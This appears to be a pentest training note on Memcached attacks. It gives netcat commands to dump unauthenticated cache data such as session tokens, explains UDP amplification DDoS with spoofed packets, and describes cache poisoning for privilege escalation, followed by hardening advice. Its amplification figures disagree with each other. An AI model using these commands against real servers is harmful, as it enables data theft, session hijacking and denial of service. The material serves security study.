---
tags: [memcached, amplification, udp, ddos, data-dumping]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.19 Memcached"
---

# 19 - Memcached: Amplification Attack & Data Dumping

## 1. Executive Summary

Memcached is a high-performance, distributed memory object caching system, intended to speed up dynamic web applications by alleviating database load. By default, it operates on **TCP and UDP Port 11211**. 

Memcached is designed for speed and simplicity, deliberately omitting complex authentication mechanisms. When developers inadvertently expose Memcached to the internet or untrusted networks, two devastating attack vectors emerge: 
1. **Data Exfiltration:** Unauthenticated attackers can connect via TCP and dump sensitive cached data (session tokens, database query results, API keys).
2. **UDP Reflection/Amplification (DRDoS):** By abusing the UDP protocol and spoofing IP addresses, attackers can leverage Memcached servers to launch colossal Distributed Denial of Service (DDoS) attacks, boasting amplification factors of up to 51,200x.

## 2. Protocol Overview & Architecture

Memcached uses a simple key-value architecture stored entirely in RAM. 
- **Slabs & Chunks:** Memory is divided into "slabs" of varying sizes. Slabs contain "chunks," which hold the actual key-value pairs.
- **Protocols:** It supports a human-readable ASCII protocol (easily manipulated via telnet) and a binary protocol.
- **UDP Architecture:** Historically, UDP support was enabled by default. UDP is connectionless, meaning Memcached processes incoming requests without verifying the sender's identity, inherently trusting the source IP address in the packet header.

## 3. Enumeration & Footprinting

Enumerating Memcached involves identifying the open port and interacting with the ASCII protocol to extract system statistics.

### Nmap Enumeration
```bash
# Check TCP port 11211
nmap -p 11211 -sV --script memcached-info <Target_IP>

# Check UDP port 11211 (crucial for Amplification checks)
nmap -p 11211 -sU -sV <Target_IP>
```

### Manual Interaction
Connecting via netcat allows immediate interaction using plain text commands.

```bash
nc -nv <Target_IP> 11211
> stats
STAT pid 1234
STAT version 1.5.6
STAT uptime 86400
STAT curr_items 5043
END
```

## 4. Exploitation Vector 1: Data Dumping

Because there is no authentication, an attacker with TCP access can dump the contents of the cache. This process is highly structured because you cannot simply issue a "dump all" command; you must identify the active slabs, extract the keys, and then request the values.

### Step-by-Step Exfiltration

**1. Identify Active Slabs**
Slabs group items by size. We need to find which slabs currently hold data.
```text
nc <Target_IP> 11211
> stats items
STAT items:1:number 14
STAT items:1:age 254
STAT items:4:number 2
END
```
*(In this example, Slab 1 has 14 items, and Slab 4 has 2 items.)*

**2. Dump Keys from a Specific Slab**
Using `stats cachedump <slab_id> <limit>`. Set limit to 0 to dump all keys in that slab.
```text
> stats cachedump 1 0
ITEM session_id_9921 [32 b; 1618928383 s]
ITEM db_query_user_admin [128 b; 1618928383 s]
END
```

**3. Retrieve the Values**
Once the keys are known, use the `get` command to extract the sensitive payload.
```text
> get session_id_9921
VALUE session_id_9921 0 32
e9a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6
END

> get db_query_user_admin
VALUE db_query_user_admin 0 45
{"username":"admin", "password_hash":"$2y$10$..."}
END
```

## 5. Exploitation Vector 2: UDP Amplification Attack (DRDoS)

The most notorious abuse of Memcached is its role in Distributed Reflection Denial of Service (DRDoS) attacks. This relies on the Memcached UDP implementation.

### The Mechanics of Amplification
1. **IP Spoofing:** The attacker creates a forged UDP packet. The "Source IP" is set to the Victim's IP address.
2. **The Payload:** The packet contains a request to retrieve a massive key from the Memcached server (e.g., `get massive_key\r\n`). This request packet is tiny, roughly 15 bytes.
3. **The Reflection:** The Memcached server receives the 15-byte request, retrieves the 1 Megabyte value from memory, and sends the 1 MB response to the "Source IP" (the Victim).
4. **The Amplification Factor:** A 15-byte request yielding a 1,000,000-byte response results in an amplification factor of ~66,000x. When coordinated across thousands of exposed Memcached servers, terabits per second of traffic crush the victim.

### Proving the Vulnerability (Without Spoofing)
To check if a Memcached server is vulnerable to UDP reflection without actually launching a DDoS, you can send a basic UDP stats request.

```bash
# Send a UDP payload containing the 'stats' command
echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u -w 1 <Target_IP> 11211
```
*If the server responds with a massive wall of statistics over UDP, it is highly vulnerable to reflection attacks.*

## 6. ASCII Architecture & Attack Diagram

```text
+----------------+                  +--------------------------------+
|   Attacker     |                  |   Exposed Memcached Server     |
| (IP: 1.1.1.1)  |                  |   (IP: 2.2.2.2 / Port 11211)   |
+----------------+                  +--------------------------------+
        |                                           |
        | 1. Craft Spoofed UDP Request (15 Bytes)   |
        |    Source IP: 3.3.3.3 (Victim)            |
        |    Target: 2.2.2.2:11211                  |
        |    Payload: "get huge_cached_payload\r\n" |
        |------------------------------------------>|
                                                    |
                                                    | 2. Process Request
                                                    |    Fetch 1MB object from RAM
                                                    |
                                                    | 3. Send UDP Response (1MB)
                                                    |    Destination: 3.3.3.3
                                                    |----------------------------------+
                                                                                       |
                                                                                       v
                                                                          +-------------------+
                                                                          |    Victim Box     |
                                                                          |  (IP: 3.3.3.3)    |
                                                                          |  OVERWHELMED      |
                                                                          |  (DDoS Condition) |
                                                                          +-------------------+
```

## 7. Post-Exploitation & Persistence

- **Session Hijacking:** Dumping Memcached often yields thousands of active PHP, Python, or Ruby session tokens. Attackers insert these tokens into their browsers to hijack administrative sessions.
- **Cache Poisoning / Modification:** If an attacker cannot achieve RCE, they can still write to the cache. Using the `set` command, they can overwrite cached database queries. If a web application caches a user's role, the attacker can overwrite `{"role":"user"}` with `{"role":"admin"}`, resulting in immediate privilege escalation on the web application.

## 8. Defense, Mitigation, & Hardening

1. **Disable UDP:** The most critical fix. Modern Memcached versions disable UDP by default. If running an older version, start the daemon with the `-U 0` flag to explicitly disable the UDP listener.
2. **Network Binding:** Never bind Memcached to `0.0.0.0`. It should only be accessible locally or within a highly trusted, isolated backend subnet.
   ```bash
   memcached -l 127.0.0.1 -p 11211 -U 0
   ```
3. **Firewall Strictness:** Block port 11211 at the edge router. Additionally, implement ingress filtering (BCP38) to drop spoofed packets originating from outside your network.
4. **SASL Authentication:** Memcached *does* support Simple Authentication and Security Layer (SASL) in modern binary protocols. If network segmentation isn't enough, compile Memcached with SASL support and mandate authentication for all cache connections.

## 9. Chaining Opportunities

- **SSRF (Server-Side Request Forgery):** Similar to Redis, Memcached is a prime target for SSRF. A blind SSRF payload can be formatted to inject CRLF characters (`\r\n`) and tunnel Memcached `get` or `set` commands, manipulating the internal cache to bypass web authentication. See **[[07 - Server-Side Request Forgery (SSRF)]]**.
- **Web App Logic Flaws:** Cache poisoning seamlessly chains into web application logic flaws and Broken Object Level Authorization (BOLA).

## 10. Related Notes
- [[16 - Redis — Unauthenticated Access, RCE via Config Set]]
- [[17 - MongoDB — No Auth, Exposed Port]]
- [[18 - Elasticsearch — Open Access, Data Exfiltration]]
- [[20 - Docker API — Exposed Daemon, Container Escape]]
